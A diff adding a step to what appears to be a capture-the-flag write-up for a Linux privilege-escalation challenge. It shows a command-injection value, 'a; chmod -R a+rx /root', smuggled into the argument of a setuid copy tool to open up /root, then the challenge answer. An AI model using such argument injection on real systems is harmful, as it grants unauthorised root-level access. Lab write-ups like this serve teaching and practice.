@@ -29,11 +29,28 @@ total 600
 -rws------ 1 root root 612560 Nov 9 21:29 runmetoanswer
 ```
 
-So
+So it seems that it is possible to inject shell commands in the arguments. We use this to add read and execu:
+```
+elf@745490537a8a:~$ simplecopy "a; chmod -R a+rx /root" b
+cp: missing destination file operand after 'a'
+Try 'cp --help' for more information.
+chmod: cannot access 'b': No such file or directory
+elf@745490537a8a:~$ ls -l /root
+total 600
+-rwsr-xr-x 1 root root 612560 Nov 9 21:29 runmetoanswer
+elf@745490537a8a:~$ /root/runmetoanswer
+Who delivers Christmas presents?
+
+> santa
+Your answer: santa
+
+Checking....
+Your answer is correct!
+```
 
 
 **Achievement: Linux PrivEsc**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTI2NDY3ODA1MywtODI2MTc4Njg0LC0yMD
-EwMTkyNjNdfQ==
+eyJoaXN0b3J5IjpbLTE2NTY5OTY0NjgsLTgyNjE3ODY4NCwtMj
+AxMDE5MjYzXX0=
 -->
